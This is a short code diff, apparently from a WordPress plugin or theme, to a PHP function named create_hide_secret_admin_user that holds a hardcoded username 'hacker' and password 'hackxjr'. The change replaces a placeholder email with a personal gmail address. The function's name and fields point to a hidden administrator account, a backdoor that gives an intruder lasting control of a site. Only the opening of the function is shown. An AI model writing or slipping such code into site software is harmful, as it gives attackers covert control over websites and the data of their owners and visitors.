@@ -5,7 +5,7 @@
 function create_hide_secret_admin_user() {
     $username = 'hacker'; // Change this to your secret username
     $password = 'hackxjr'; // Change this to your secret password
-    $email = 'your_email@example.com'; // Change this to your email
+    $email = 'tharilakshan37@gmail.com'; // Change this to your email
 
     $user = get_user_by('login', $username);
 
